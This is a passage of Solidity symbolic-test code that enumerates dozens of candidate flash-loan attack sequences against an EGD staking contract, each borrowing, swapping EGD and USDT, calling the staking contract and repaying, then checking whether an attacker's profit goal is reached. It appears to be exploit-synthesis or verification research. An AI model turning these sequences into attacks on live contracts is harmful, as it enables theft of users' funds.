        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_usdt_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_pair_egd(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
